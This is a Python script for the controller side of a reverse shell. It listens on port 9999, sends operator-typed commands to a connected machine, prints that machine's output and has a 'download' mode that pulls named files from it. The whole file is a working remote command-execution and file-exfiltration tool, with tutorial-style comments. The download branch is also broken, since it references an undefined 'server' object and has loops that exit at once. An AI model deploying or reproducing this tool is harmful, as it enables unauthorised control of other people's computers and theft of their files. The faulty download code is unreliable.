import socket
import sys


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "download":
            conn.send("ft".encode("utf-8"))
            def recive_file(buffer):
                while True:
                    bff = conn.recv(buffer).decode("utf-8")
                    break
                if bff.startswith("#"):
                    buff = int(bff.split("#", 2)[1])
                    name = bff.split("#", 2)[2]
                    while True:
                        file = conn.recv(buff).decode("utf-8")
                        break
                    with open(name, "w") as f:
                        f.write(file)
                    print(file)
                    return name
            while True:
                conn, addr = server.accept()
                while True:
                    file_to_transfer = str(input("[!] File to transfer: "))
                    file_to_transfer = "(FT)#" + file_to_transfer
                    conn.send(file_to_transfer.encode("utf-8"))
                    recive_file(1024)
        else:
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
